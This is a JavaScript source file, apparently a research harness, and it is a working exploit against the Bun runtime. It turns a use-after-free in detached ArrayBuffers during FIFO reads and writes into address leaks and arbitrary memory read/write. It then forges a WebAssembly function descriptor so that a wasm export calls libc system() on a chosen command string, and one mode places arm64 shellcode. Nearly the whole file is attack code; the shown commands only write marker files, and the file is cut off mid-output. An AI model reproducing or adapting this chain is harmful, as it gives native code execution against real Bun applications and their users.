// Local-oracle probe for turning the addrof -> ArrayBuffer metadata native view
// into a forged WebAssembly descriptor call against a chosen native callee.
//
// The layout census found a low image-range pointer at:
//   wasm function JSCell + WASM_EXEC_FIELD -> heap object
//   heap object + WASM_CODE_FIELD -> apparent executable/code pointer
//
// This harness creates two same-signature wasm exports, reads both apparent
// metadata objects, writes a fake descriptor over export_a's matching field,
// calls export_a, then restores export_a. This harness intentionally uses
// bun:ffi as an address/pointer oracle for native-callee experiments.

import fs from "node:fs";
import { spawnSync } from "node:child_process";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { dlopen, FFIType, JSCallback, ptr, read, suffix } from "bun:ffi";

const addrofSize = Number(process.env.ADDROF_SIZE || 8192);
const addrofSlots = Number(process.env.ADDROF_SLOTS || 1024);
const addrofSprayCount = Number(process.env.ADDROF_SPRAY_COUNT || 4096);
const addrofElementOffset = Number(process.env.ADDROF_ELEMENT_OFFSET || 144);
const uafSize = Number(process.env.UAF_SIZE || 128);
const viewSize = Number(process.env.VIEW_SIZE || 128);
const sprayCount = Number(process.env.SPRAY_COUNT || 16384);
const bridgeAttempts = Number(process.env.BRIDGE_ATTEMPTS || 64);
const writeOffset = Number(process.env.WRITE_OFFSET || 16);
const readTimeoutMs = Number(process.env.READ_TIMEOUT_MS || 5000);
const fillChunkSize = Number(process.env.FILL_CHUNK_SIZE || 4096);
const maxFillBytes = Number(process.env.MAX_FILL_BYTES || (1 << 20));
const wasmExecField = Number(process.env.WASM_EXEC_FIELD || 24);
const wasmCodeField = Number(process.env.WASM_CODE_FIELD || 24);
const markerImport = process.env.MARKER_IMPORT === "1";
const markerPath = process.env.MARKER_PATH || "/tmp/bun_uaf_noffi_wasm_marker";
const commandImport = process.env.COMMAND_IMPORT === "1";
const commandMarkerPath = process.env.COMMAND_MARKER_PATH || "/tmp/bun_uaf_noffi_command_marker";
const markerCommand = process.env.MARKER_COMMAND || `printf 'wasm-command:${process.pid}\\n' > ${commandMarkerPath}`;
const crossModule = process.env.CROSS_MODULE === "1";
const fakeDescriptor = process.env.FAKE_DESCRIPTOR === "1";
const fakeDescriptorMode = process.env.FAKE_DESCRIPTOR_MODE || "replacement";
const fakeDescriptorWordEnv = process.env.FAKE_DESCRIPTOR_WORD;
const fakeDescriptorSymbol = process.env.FAKE_DESCRIPTOR_SYMBOL || "strlen";
const fakeDescriptorLibrary = process.env.FAKE_DESCRIPTOR_LIBRARY || `libc.${suffix}`;
const patchScope = process.env.PATCH_SCOPE || ((markerImport || fakeDescriptor) ? "cell" : "exec");
const patchField = Number(process.env.PATCH_FIELD || (patchScope === "cell" ? 48 : wasmCodeField));
const extraCellFields = process.env.EXTRA_CELL_FIELDS
  ? process.env.EXTRA_CELL_FIELDS.split(",").filter(Boolean).map(value => Number(value))
  : [];
const readBytes = Number(process.env.READ_BYTES || 64);
const warmIterations = Number(process.env.WARM_ITERATIONS || 10000);
const realTypedArrayArw = process.env.REAL_TYPEDARRAY_ARW === "1";
const realArwViewSize = Number(process.env.REAL_ARW_VIEW_SIZE || 8);
const stopBeforePatch = process.env.STOP_BEFORE_PATCH === "1";
const systemProbePath = process.env.SYSTEM_PROBE_PATH || "/tmp/bun_uaf_descriptor_system_probe";
const systemCommand = process.env.SYSTEM_COMMAND || `printf 'descriptor-system:%s\\n' "$$" > ${systemProbePath}`;
const systemCommandBytes = new Uint8Array([...new TextEncoder().encode(systemCommand), 0]);
const systemCommandHolder = Buffer.from(systemCommandBytes);
const systemPointer = resolveSymbolPointer("system");
let resolvedDescriptorSymbolPointer = 0n;
let wasmArgValue = BigInt(Math.trunc(ptr(systemCommandHolder)));
const retainedBridgeCarriers = [];
const callbackReturnValue = Number(process.env.CALLBACK_RETURN_VALUE || 31337);
const callbackCalls = [];
let abiCallback = null;
let abiCallbackPointer = 0n;

function ensureAbiCallback() {
  if (abiCallback) return abiCallbackPointer;
  abiCallback = new JSCallback(
    (...args) => {
      callbackCalls.push(args.map(arg => typeof arg === "bigint" ? arg : BigInt(Math.trunc(arg || 0))));
      return callbackReturnValue;
    },
    {
      args: [
        FFIType.ptr,
        FFIType.ptr,
        FFIType.ptr,
        FFIType.ptr,
        FFIType.ptr,
        FFIType.ptr,
        FFIType.ptr,
        FFIType.ptr,
      ],
      returns: FFIType.i32,
    },
  );
  abiCallbackPointer = BigInt(Math.trunc(abiCallback.ptr));
  return abiCallbackPointer;
}

function expectedTargetResult() {
  return 42;
}

function expectedReplacementResult(_arg0 = wasmArgValue) {
  return 7;
}

function resolveSymbolPointer(name, library = `libc.${suffix}`) {
  const lib = dlopen(`libc.${suffix}`, {
    dlopen: { args: ["cstring", "int"], returns: "ptr" },
    dlsym: { args: ["ptr", "cstring"], returns: "ptr" },
  });
  const enc = new TextEncoder();
  const libraryName = new Uint8Array([...enc.encode(library), 0]);
  const symbolName = new Uint8Array([...enc.encode(name), 0]);
  const handle = lib.symbols.dlopen(ptr(libraryName), 1);
  if (!handle) throw new Error(`failed to dlopen ${library}`);
  const address = lib.symbols.dlsym(handle, ptr(symbolName));
  if (!address) throw new Error(`failed to dlsym ${name}`);
  return BigInt(Math.trunc(address));
}

function refreshWasmArgValue() {
  wasmArgValue = BigInt(Math.trunc(ptr(systemCommandHolder)));
  return wasmArgValue;
}

function pointerBytesHex(address, length = 32) {
  try {
    const base = Number(address);
    const bytes = [];
    for (let i = 0; i < length; i++) bytes.push(read.u8(base, i).toString(16).padStart(2, "0"));
    return bytes.join("");
  } catch (error) {
    return `error:${error?.message || error}`;
  }
}

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

function detach(ab) {
  if (typeof ab.transfer === "function") ab.transfer(0);
  else structuredClone({}, { transfer: [ab] });
}

function gcNow() {
  if (typeof globalThis.Bun?.gc === "function") globalThis.Bun.gc(true);
  if (typeof globalThis.gc === "function") globalThis.gc();
}

function hex(value, width = 16) {
  return `0x${value.toString(16).padStart(width, "0")}`;
}

function makeFifo(label) {
  const path = join(tmpdir(), `bun-wasm-codeptr-${label}-${process.pid}-${Math.random().toString(16).slice(2)}`);
  const mkfifo = spawnSync("mkfifo", [path], { stdio: "inherit" });
  if (mkfifo.status !== 0) throw new Error(`mkfifo failed with status ${mkfifo.status}`);
  const readFd = fs.openSync(path, fs.constants.O_RDONLY | fs.constants.O_NONBLOCK);
  const fillFd = fs.openSync(path, fs.constants.O_WRONLY | fs.constants.O_NONBLOCK);
  const writeFd = fs.openSync(path, fs.constants.O_WRONLY);
  return { path, readFd, fillFd, writeFd };
}

function closeFifo(fifo) {
  for (const fd of [fifo.writeFd, fifo.fillFd, fifo.readFd]) {
    try { fs.closeSync(fd); } catch {}
  }
  try { fs.unlinkSync(fifo.path); } catch {}
}

function isAgain(error) {
  return error?.code === "EAGAIN" || error?.code === "EWOULDBLOCK";
}

function fillFifo(fifo) {
  const chunk = Buffer.alloc(fillChunkSize, 0x2e);
  let filled = 0;
  while (filled < maxFillBytes) {
    try {
      const n = fs.writeSync(fifo.fillFd, chunk, 0, Math.min(chunk.length, maxFillBytes - filled));
      if (n === 0) break;
      filled += n;
    } catch (error) {
      if (isAgain(error)) break;
      throw error;
    }
  }
  if (filled === 0) throw new Error("failed to fill FIFO");
  return filled;
}

async function readExact(fifo, byteLength, label) {
  const chunks = [];
  const scratch = Buffer.alloc(Math.min(8192, Math.max(1, byteLength)));
  let total = 0;
  const deadline = Date.now() + readTimeoutMs;
  while (total < byteLength) {
    try {
      const n = fs.readSync(fifo.readFd, scratch, 0, Math.min(scratch.length, byteLength - total), null);
      if (n > 0) {
        chunks.push(Buffer.from(scratch.subarray(0, n)));
        total += n;
        continue;
      }
    } catch (error) {
      if (!isAgain(error)) throw error;
    }
    if (Date.now() >= deadline) throw new Error(`timed out reading ${label}: ${total}/${byteLength}`);
    await sleep(1);
  }
  return Buffer.concat(chunks, total);
}

function readU64LEBytes(buf, offset) {
  let value = 0n;
  for (let i = 7; i >= 0; i--) value = (value << 8n) | BigInt(buf[offset + i]);
  return value;
}

function readU64LE(view, offset) {
  let value = 0n;
  for (let i = 7; i >= 0; i--) value = (value << 8n) | BigInt(view[offset + i]);
  return value;
}

function writeU64LE(view, offset, value) {
  let v = value;
  for (let i = 0; i < 8; i++) {
    view[offset + i] = Number(v & 0xffn);
    v >>= 8n;
  }
}

function payloadU64(value) {
  const out = Buffer.alloc(8);
  let v = value;
  for (let i = 0; i < 8; i++) {
    out[i] = Number(v & 0xffn);
    v >>= 8n;
  }
  return out;
}

function classifyPointer(value) {
  if ((value >> 48n) !== 0n || (value & 0x7n) !== 0n) return null;
  if (value >= 0x0000000100000000n && value < 0x0000008000000000n) return "low-code-or-image";
  if (value >= 0x0000600000000000n && value < 0x0000640000000000n) return "asan-heap";
  if (value >= 0x0000100000000000n && value < 0x0000800000000000n) return "canonical-high";
  return null;
}

async function addrof(target) {
  const fifo = makeFifo("addrof");
  const retained = [];
  try {
    const filled = fillFifo(fifo);
    const ab = new ArrayBuffer(addrofSize);
    const source = new Uint8Array(ab);
    source.fill(0x51);
    const done = new Promise(resolve => {
      fs.write(fifo.writeFd, source, 0, source.byteLength, null, (err, bytesWritten) => {
        resolve({ err, bytesWritten });
      });
    });
    detach(ab);
    gcNow();
    for (let i = 0; i < addrofSprayCount; i++) {
      const arr = new Array(addrofSlots);
      for (let j = 0; j < addrofSlots; j++) arr[j] = target;
      retained.push(arr);
    }
    gcNow();
    await readExact(fifo, filled, "prefill");
    const leaked = await readExact(fifo, addrofSize, "addrof-leak");
    await done;
    return readU64LEBytes(leaked, addrofElementOffset);
  } finally {
    closeFifo(fifo);
    retained.length = 0;
  }
}

function makeBridgeCarrier(index) {
  const fill = (0x71 + (index & 15)) & 0xff;
  const view = new Uint8Array(new ArrayBuffer(viewSize));
  view.fill(fill);
  return view;
}

function freshCarrierBytes(carrier) {
  return new Uint8Array(carrier.buffer);
}

function allocateBridgeCarriers() {
  const retained = [];
  for (let i = 0; i < sprayCount; i++) retained.push(makeBridgeCarrier(i));
  return retained;
}

async function corruptBridgeToAddress(address) {
  const path = join(tmpdir(), `bun-wasm-codeptr-write-${process.pid}-${Math.random().toString(16).slice(2)}`);
  const mkfifo = spawnSync("mkfifo", [path], { stdio: "inherit" });
  if (mkfifo.status !== 0) throw new Error(`mkfifo failed with status ${mkfifo.status}`);
  const fd = fs.openSync(path, fs.constants.O_RDWR);
  try {
    const ab = new ArrayBuffer(uafSize);
    const target = new Uint8Array(ab);
    target.fill(0x51);
    const done = new Promise(resolve => {
      fs.read(fd, target, writeOffset, 8, null, (err, bytesRead) => resolve({ err, bytesRead }));
    });
    detach(ab);
    gcNow();
    const bridgeCarriers = allocateBridgeCarriers();
    gcNow();
    fs.writeSync(fd, payloadU64(address), 0, 8);
    const result = await done;
    return { bridgeCarriers, bytesRead: result.bytesRead, err: result.err?.message };
  } finally {
    fs.closeSync(fd);
    fs.unlinkSync(path);
  }
}

function findRemappedBridge(bridgeCarriers, requireLengthFields = false) {
  for (let i = 0; i < bridgeCarriers.length; i++) {
    try {
      const fresh = freshCarrierBytes(bridgeCarriers[i]);
      const expected = (0x71 + (i & 15)) & 0xff;
      if (fresh[0] === expected) continue;
      const dataPtr = readU64LE(fresh, 16);
      const byteLength = readU64LE(fresh, 48);
      const maxByteLength = readU64LE(fresh, 56);
      const lengthOk = byteLength === BigInt(viewSize) && maxByteLength === BigInt(viewSize);
      if (classifyPointer(dataPtr) && (!requireLengthFields || lengthOk)) {
        return { index: i, fresh, dataPtr, byteLength, maxByteLength };
      }
    } catch {}
  }
  return null;
}

async function buildNativeView() {
  const victimBuffer = new ArrayBuffer(viewSize);
  const victimView = new Uint8Array(victimBuffer);
  victimView.fill(0xa5);
  const victimAddress = await addrof(victimBuffer);

  let wrapperBridge = null;
  for (let attempt = 1; attempt <= bridgeAttempts; attempt++) {
    const result = await corruptBridgeToAddress(victimAddress);
    retainedBridgeCarriers.push(result.bridgeCarriers);
    wrapperBridge = findRemappedBridge(result.bridgeCarriers, false);
    if (wrapperBridge) break;
  }
  if (!wrapperBridge) throw new Error("failed to map ArrayBuffer wrapper");

  let metadataBridge = null;
  for (let attempt = 1; attempt <= bridgeAttempts; attempt++) {
    const result = await corruptBridgeToAddress(wrapperBridge.dataPtr);
    retainedBridgeCarriers.push(result.bridgeCarriers);
    metadataBridge = findRemappedBridge(result.bridgeCarriers, true);
    if (metadataBridge) break;
  }
  if (!metadataBridge) throw new Error("failed to map ArrayBuffer metadata");

  return {
    victimBuffer,
    metadataView: metadataBridge.fresh,
    originalDataPtr: metadataBridge.dataPtr,
    victimAddress,
    wrapperAddress: wrapperBridge.dataPtr,
  };
}

function wordsFromBytes(bytes) {
  const words = [];
  for (let offset = 0; offset + 8 <= bytes.length; offset += 8) {
    const value = readU64LEBytes(bytes, offset);
    words.push({ offset, value: hex(value), class: classifyPointer(value) });
  }
  return words;
}

const native = await buildNativeView();

function withMetadataPointer(address, fn) {
  writeU64LE(native.metadataView, 16, address);
  try {
    return fn(new Uint8Array(native.victimBuffer));
  } finally {
    writeU64LE(native.metadataView, 16, native.originalDataPtr);
  }
}

function metadataReadAddress(address, length = readBytes) {
  return withMetadataPointer(address, view => Buffer.from(view.subarray(0, Math.min(length, view.length))));
}

function metadataWriteAddress(address, bytes) {
  return withMetadataPointer(address, view => {
    view.set(bytes, 0);
  });
}

let readAddress = metadataReadAddress;
let writeAddress = metadataWriteAddress;
let realArwSummary = null;

async function buildRealTypedArrayArw() {
  const rwView = new Uint8Array(realArwViewSize);
  rwView.fill(0xcc);
  const rwCellAddress = await addrof(rwView);
  const rwPrefix = metadataReadAddress(rwCellAddress, 32);
  const originalVector = readU64LEBytes(rwPrefix, 16);
  const originalLength = readU64LEBytes(rwPrefix, 24);

  if (!classifyPointer(rwCellAddress) || !classifyPointer(originalVector)) {
    throw new Error(`real typed-array ARW setup found non-pointer cell/vector cell=${hex(rwCellAddress)} vector=${hex(originalVector)}`);
  }

  function restore() {
    metadataWriteAddress(rwCellAddress + 16n, payloadU64(originalVector));
    metadataWriteAddress(rwCellAddress + 24n, payloadU64(originalLength));
  }

  function withRealPointer(address, length, fn) {
    const n = Math.max(1, length);
    metadataWriteAddress(rwCellAddress + 16n, payloadU64(address));
    metadataWriteAddress(rwCellAddress + 24n, payloadU64(BigInt(n)));
    try {
      return fn(rwView);
    } finally {
      restore();
    }
  }

  function realReadAddress(address, length = readBytes) {
    return withRealPointer(address, length, view => {
      const out = Buffer.alloc(length);
      for (let i = 0; i < length; i++) out[i] = view[i];
      return out;
    });
  }

  function realWriteAddress(address, bytes) {
    return withRealPointer(address, bytes.length, view => {
      for (let i = 0; i < bytes.length; i++) view[i] = bytes[i];
    });
  }

  const restorePrefix = metadataReadAddress(rwCellAddress, 32);
  const restoreVector = readU64LEBytes(restorePrefix, 16);
  const restoreLength = readU64LEBytes(restorePrefix, 24);
  if (restoreVector !== originalVector || restoreLength !== originalLength) {
    restore();
  }

  return {
    readAddress: realReadAddress,
    writeAddress: realWriteAddress,
    summary: {
      viewSize: realArwViewSize,
      rwCellAddress: hex(rwCellAddress),
      originalVector: hex(originalVector),
      originalLength: hex(originalLength),
      cellPrefixWords: wordsFromBytes(rwPrefix),
    },
  };
}

if (realTypedArrayArw) {
  const realArw = await buildRealTypedArrayArw();
  readAddress = realArw.readAddress;
  writeAddress = realArw.writeAddress;
  realArwSummary = realArw.summary;
}

function writeU64Address(address, value) {
  writeAddress(address, payloadU64(value));
}

async function arrayBufferDataPointer(buffer) {
  const wrapperAddress = await addrof(buffer);
  const wrapperPrefix = readAddress(wrapperAddress, 64);
  const metadataAddress = readU64LEBytes(wrapperPrefix, 16);
  const metadataPrefix = readAddress(metadataAddress, 64);
  const dataAddress = readU64LEBytes(metadataPrefix, 16);
  return {
    wrapperAddress,
    metadataAddress,
    dataAddress,
    wrapperWords: wordsFromBytes(wrapperPrefix),
    metadataWords: wordsFromBytes(metadataPrefix),
  };
}

function makeWasmExports() {
  let markerArmed = false;
  let commandStatus = null;
  let commandError = null;
  const armedMarkerArgs = [];
  const imports = markerImport ? {
    env: {
      mark(arg0) {
        const arg = BigInt(arg0);
        if (markerArmed) {
          armedMarkerArgs.push(arg);
          if (commandImport) {
            const result = spawnSync("/bin/sh", ["-c", markerCommand], { stdio: "ignore" });
            commandStatus = result.status;
            commandError = result.error?.message || null;
          }
          fs.writeFileSync(markerPath, `wasm-marker:${process.pid} arg=${hex(arg)}\n`);
        }
        return expectedReplacementResult(arg);
      },
    },
  } : {};

  if (crossModule) {
    const targetWasm = new Uint8Array([
      0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
      0x01, 0x06, 0x01, 0x60, 0x01, 0x7e, 0x01, 0x7f,
      0x03, 0x02, 0x01, 0x00,
      0x07, 0x05, 0x01, 0x01, 0x61, 0x00, 0x00,
      0x0a, 0x06, 0x01, 0x04, 0x00, 0x41, 0x2a, 0x0b,
    ]);
    const replacementWasm = markerImport
      ? new Uint8Array([
        0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
        0x01, 0x06, 0x01, 0x60, 0x01, 0x7e, 0x01, 0x7f,
        0x02, 0x0c, 0x01, 0x03, 0x65, 0x6e, 0x76, 0x04, 0x6d, 0x61, 0x72, 0x6b, 0x00, 0x00,
        0x03, 0x02, 0x01, 0x00,
        0x07, 0x05, 0x01, 0x01, 0x62, 0x00, 0x01,
        0x0a, 0x08, 0x01, 0x06, 0x00, 0x20, 0x00, 0x10, 0x00, 0x0b,
      ])
      : new Uint8Array([
        0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
        0x01, 0x06, 0x01, 0x60, 0x01, 0x7e, 0x01, 0x7f,
        0x03, 0x02, 0x01, 0x00,
        0x07, 0x05, 0x01, 0x01, 0x62, 0x00, 0x00,
        0x0a, 0x06, 0x01, 0x04, 0x00, 0x41, 0x07, 0x0b,
      ]);
    const targetInstance = new WebAssembly.Instance(new WebAssembly.Module(targetWasm));
    const replacementInstance = new WebAssembly.Instance(new WebAssembly.Module(replacementWasm), imports);
    const a = targetInstance.exports.a;
    const b = replacementInstance.exports.b;
    for (let i = 0; i < warmIterations; i++) {
      a(wasmArgValue);
      b(wasmArgValue);
    }
    return {
      a,
      b,
      armMarker() { markerArmed = true; },
      disarmMarker() { markerArmed = false; },
      commandResult() { return { status: commandStatus, error: commandError }; },
      markerArgs() { return armedMarkerArgs.slice(); },
    };
  }

  throw new Error("wasm-export-i32-arg-redirect-probe requires CROSS_MODULE=1");
}

async function inspectExport(label, fn) {
  const functionAddress = await addrof(fn);
  const cellPrefix = readAddress(functionAddress, readBytes);
  const execAddress = readU64LEBytes(cellPrefix, wasmExecField);
  const execPrefix = readAddress(execAddress, readBytes);
  const codeAddress = readU64LEBytes(execPrefix, wasmCodeField);
  return {
    label,
    functionAddress,
    execAddress,
    codeAddress,
    cellPrefix,
    execPrefix,
    summary: {
      label,
      functionAddress: hex(functionAddress),
      execAddress: hex(execAddress),
      execClass: classifyPointer(execAddress),
      codeAddress: hex(codeAddress),
      codeClass: classifyPointer(codeAddress),
      cellWords: wordsFromBytes(cellPrefix),
      execWords: wordsFromBytes(execPrefix),
    },
  };
}

const { a, b, armMarker, disarmMarker, commandResult, markerArgs } = makeWasmExports();
const beforeA = a(wasmArgValue);
const beforeB = b(wasmArgValue);
if (markerImport) {
  disarmMarker();
  try { fs.unlinkSync(markerPath); } catch {}
  if (commandImport) {
    try { fs.unlinkSync(commandMarkerPath); } catch {}
  }
}
const markerBefore = markerImport ? fs.existsSync(markerPath) : undefined;
const commandMarkerBefore = markerImport && commandImport ? fs.existsSync(commandMarkerPath) : undefined;
const infoA = await inspectExport("a", a);
const infoB = await inspectExport("b", b);

function patchBase(info) {
  switch (patchScope) {
    case "cell":
      return { address: info.functionAddress, bytes: info.cellPrefix, label: "function-cell" };
    case "exec":
      return { address: info.execAddress, bytes: info.execPrefix, label: "exec-metadata" };
    default:
      throw new Error("PATCH_SCOPE must be cell or exec");
  }
}

const patchA = patchBase(infoA);
const patchB = patchBase(infoB);
if (patchField < 0 || patchField + 8 > patchA.bytes.length || patchField + 8 > patchB.bytes.length) {
  throw new Error("PATCH_FIELD must leave room for one qword inside READ_BYTES");
}
if (extraCellFields.length > 0 && patchScope !== "cell") {
  throw new Error("EXTRA_CELL_FIELDS requires PATCH_SCOPE=cell");
}
for (const offset of extraCellFields) {
  if (!Number.isFinite(offset) || offset < 0 || offset + 8 > patchA.bytes.length || offset + 8 > patchB.bytes.length) {
    throw new Error("each EXTRA_CELL_FIELDS entry must leave room for one qword inside READ_BYTES");
  }
}

const patchAddress = patchA.address + BigInt(patchField);
const originalPatchValue = readU64LEBytes(patchA.bytes, patchField);
const replacementPatchValue = readU64LEBytes(patchB.bytes, patchField);
let extraPatches = extraCellFields.map(offset => {
  const originalValue = readU64LEBytes(patchA.bytes, offset);
  const replacementValue = readU64LEBytes(patchB.bytes, offset);
  return {
    offset,
    address: patchA.address + BigInt(offset),
    originalValue,
    replacementValue,
  };
});

if (fakeDescriptorMode === "system") {
  extraPatches = extraPatches.map(patch => patch.offset === 40
    ? { ...patch, replacementValue: wasmArgValue, forcedSystemArgument: true }
    : patch);
}
let effectiveReplacementPatchValue = replacementPatchValue;
let fakeDescriptorSummary = null;

if (fakeDescriptor) {
  if (patchScope !== "cell" || patchField !== 48) {
    throw new Error("FAKE_DESCRIPTOR requires PATCH_SCOPE=cell and PATCH_FIELD=48");
  }

  const originalDescriptorBytes = readAddress(originalPatchValue, 8);
  const replacementDescriptorBytes = readAddress(replacementPatchValue, 8);
  const originalDescriptorWord = readU64LEBytes(originalDescriptorBytes, 0);
  const replacementDescriptorWord = readU64LEBytes(replacementDescriptorBytes, 0);
  let shellcodeData = null;
  let deferredCallbackDescriptor = false;
  let deferredSymbolDescriptor = false;

  let fakeDescriptorWord;
  switch (fakeDescriptorMode) {
    case "original":
      fakeDescriptorWord = originalDescriptorWord;
      break;
    case "replacement":
      fakeDescriptorWord = replacementDescriptorWord;
      break;
    case "custom":
      if (!fakeDescriptorWordEnv) throw new Error("FAKE_DESCRIPTOR_MODE=custom requires FAKE_DESCRIPTOR_WORD");
      fakeDescriptorWord = BigInt(fakeDescriptorWordEnv);
      break;
    case "system":
      fakeDescriptorWord = systemPointer;
      break;
    case "symbol":
      fakeDescriptorWord = 0n;
      deferredSymbolDescriptor = true;
      break;
    case "callback":
      fakeDescriptorWord = 0n;
      deferredCallbackDescriptor = true;
      break;
    case "data-ret": {
      const shellcodeBuffer = new ArrayBuffer(16);
      const shellcodeBytes = new Uint8Array(shellcodeBuffer);
      shellcodeBytes.set([0xc0, 0x03, 0x5f, 0xd6]); // arm64 ret
      shellcodeData = await arrayBufferDataPointer(shellcodeBuffer);
      fakeDescriptorWord = shellcodeData.dataAddress;
      break;
    }
    case "zero":
      fakeDescriptorWord = 0n;
      break;
    default:
      throw new Error("FAKE_DESCRIPTOR_MODE must be original, replacement, custom, system, symbol, callback, data-ret, or zero");
  }

  const fakeDescriptorBuffer = new ArrayBuffer(8);
  const fakeDescriptorBytes = new Uint8Array(fakeDescriptorBuffer);
  const fakeDescriptorData = await arrayBufferDataPointer(fakeDescriptorBuffer);
  if (deferredSymbolDescriptor) {
    resolvedDescriptorSymbolPointer = resolveSymbolPointer(fakeDescriptorSymbol, fakeDescriptorLibrary);
    fakeDescriptorWord = resolvedDescriptorSymbolPointer;
  }
  if (deferredCallbackDescriptor) {
    fakeDescriptorWord = ensureAbiCallback();
  }
  fakeDescriptorBytes.set(payloadU64(fakeDescriptorWord));
  effectiveReplacementPatchValue = fakeDescriptorData.dataAddress;
  fakeDescriptorSummary = {
    mode: fakeDescriptorMode,
    bufferAddress: hex(fakeDescriptorData.wrapperAddress),
    metadataAddress: hex(fakeDescriptorData.metadataAddress),
    dataAddress: hex(fakeDescriptorData.dataAddress),
    originalDescriptorPointer: hex(originalPatchValue),
    originalDescriptorWord: hex(originalDescriptorWord),
    originalDescriptorWordClass: classifyPointer(originalDescriptorWord),
    replacementDescriptorPointer: hex(replacementPatchValue),
    replacementDescriptorWord: hex(replacementDescriptorWord),
    replacementDescriptorWordClass: classifyPointer(replacementDescriptorWord),
    shellcodeData: shellcodeData && {
      bufferAddress: hex(shellcodeData.wrapperAddress),
      metadataAddress: hex(shellcodeData.metadataAddress),
      dataAddress: hex(shellcodeData.dataAddress),
    },
    fakeDescriptorWord: hex(fakeDescriptorWord),
    fakeDescriptorWordClass: classifyPointer(fakeDescriptorWord),
  };
}

refreshWasmArgValue();
const wasmArgBytesBeforeCall = pointerBytesHex(wasmArgValue);

if (stopBeforePatch) {
  const output = {
    final: true,
    harness: "wasm-descriptor-system-i64-probe",
    dryRun: "stop-before-patch",
    fakeDescriptor,
    fakeDescriptorMode: fakeDescriptor ? fakeDescriptorMode : undefined,
    fakeDescriptorSummary,
    systemPointer: hex(systemPointer),
    fakeDescriptorSymbol,
    fakeDescriptorLibrary,
    resolvedDescriptorSymbolPointer: hex(resolvedDescriptorSymbolPointer),
    systemCommandPointer: hex(wasmArgValue),
    systemCommandPointerBytes: wasmArgBytesBeforeCall,
    abiCallbackPointer: hex(abiCallbackPointer),
    callbackReturnValue,
    beforeA,
    beforeB,
    infoA: infoA.summary,
    infoB: infoB.summary,
    patchTarget: patchA.label,
    patchAddress: hex(patchAddress),
    originalPatchValue: hex(originalPatchValue),
    originalPatchClass: classifyPointer(originalPatchValue),
    replacementPatchValue: hex(replacementPatchValue),
    replacementPatchClass: classifyPointer(replacementPatchValue),
    effectiveReplacementPatchValue: hex(effectiveReplacementPatchValue),
    effectiveReplacementPatchClass: classifyPointer(effectiveReplacementPatchValue),
    extraPatches: extraPatches.map(patch => ({
      offset: patch.offset,
      address: hex(patch.address),
      originalValue: hex(patch.originalValue),
      originalClass: classifyPointer(patch.originalValue),
      replacementValue: hex(patch.replacementValue),
      replacementClass: classifyPointer(patch.replacementValue),
    })),
    ok: true,
  };
  fs.writeSync(1, `${JSON.stringify(output, null, 2)}\n`);
  process.reallyExit(86);
}

let patchedA;
let restoredA;
let callError;
let restoreError;
let patchError;

try {
  for (const patch of extraPatches) {
    writeU64Address(patch.address, patch.replacementValue);
  }
  writeU64Address(patchAddress, effectiveReplacementPatchValue);
  if (markerImport) armMarker();
  patchedA = a(wasmArgValue);
} catch (error) {
  callError = error?.message || String(error);
} finally {
  if (markerImport) disarmMarker();
  try {
    writeU64Address(patchAddress, originalPatchValue);
    for (let i = extraPatches.length - 1; i >= 0; i--) {
      const patch = extraPatches[i];
      writeU64Address(patch.address, patch.originalValue);
    }
    restoredA = a(wasmArgValue);
  } catch (error) {
    restoreError = error?.message || String(error);
  }
}

const rereadAExec = (() => {
  try { return readAddress(infoA.execAddress, readBytes); } catch { return null; }
})();
const markerAfter = markerImport ? fs.existsSync(markerPath) : undefined;
const commandMarkerAfter = markerImport && commandImport ? fs.existsSync(commandMarkerPath) : undefined;
const commandResultAfter = markerImport && commandImport ? commandResult() : undefined;
const markerArgsAfter = markerImport ? markerArgs() : undefined;
const systemProbeAfter = fs.existsSync(systemProbePath);
const systemProbeText = systemProbeAfter ? fs.readFileSync(systemProbePath, "utf8") : null;
const expectedBeforeA = expectedTargetResult();
const expectedBeforeB = expectedReplacementResult();
const markerArgObserved = markerArgsAfter?.some(arg => arg === wasmArgValue);
const callbackMode = fakeDescriptor && fakeDescriptorMode === "callback";
const callbackArgWords = callbackCalls.map(args => args.map(arg => hex(arg)));
const callbackSawWasmArg = callbackCalls.some(args => args.some(arg => arg === wasmArgValue));

const ok =
  beforeA === expectedBeforeA &&
  beforeB === expectedBeforeB &&
  !patchError &&
  !callError &&
  !restoreError &&
  (callbackMode ? callbackCalls.length > 0 && patchedA === callbackReturnValue : systemProbeAfter) &&
  restoredA === expectedBeforeA &&
  (!markerImport || markerArgObserved);

const output = {
  final: true,
  harness: "wasm-descriptor-system-i64-probe",
  noFfi: false,
  ffiUse: "dlsym/ptr address oracle only",
  nativeHelperDylib: false,
  realTypedArrayArw,
  realArwSummary,
  dlsymOracle: true,
  systemPointer: hex(systemPointer),
  fakeDescriptorSymbol: fakeDescriptorMode === "symbol" ? fakeDescriptorSymbol : undefined,
  fakeDescriptorLibrary: fakeDescriptorMode === "symbol" ? fakeDescriptorLibrary : undefined,
  resolvedDescriptorSymbolPointer: fakeDescriptorMode === "symbol" ? hex(resolvedDescriptorSymbolPointer) : undefined,
  systemCommandPointer: hex(wasmArgValue),
  systemCommandPointerBytes: wasmArgBytesBeforeCall,
  abiCallbackPointer: hex(abiCallbackPointer),
  callbackReturnValue,
  callbackCalls: callbackArgWords,
  callbackSawWasmArg,
  systemCommand,
  systemProbePath,
  systemProbeAfter,
  systemProbeText,
  wasmArgValue: hex(wasmArgValue),
  expectedBeforeA,
  expectedBeforeB,
  markerImport,
  markerPath: markerImport ? markerPath : undefined,
  markerBefore,
  markerAfter,
  markerArgsAfter,
  markerArgObserved,
  commandImport,
  commandMarkerPath: commandImport ? commandMarkerPath : undefined,
  markerCommand: commandImport ? markerCommand : undefined,
  commandMarkerBefore,
  commandMarkerAfter,
  commandResultAfter,
  crossModule,
  fakeDescriptor,
  fakeDescriptorMode: fakeDescriptor ? fakeDescriptorMode : undefined,
  fakeDescriptorSummary,
  wasmExecField,
  wasmCodeField,
  patchScope,
  patchField,
  extraCellFields,
  extraPatches: extraPatches.map(patch => ({
    offset: patch.offset,
    address: hex(patch.address),
    originalValue: hex(patch.originalValue),
    originalClass: classifyPointer(patch.originalValue),
    replacementValue: hex(patch.replacementValue),
    replacementClass: classifyPointer(patch.replacementValue),
  })),
  patchTarget: patchA.label,
  patchAddress: hex(patchAddress),
  originalPatchValue: hex(originalPatchValue),
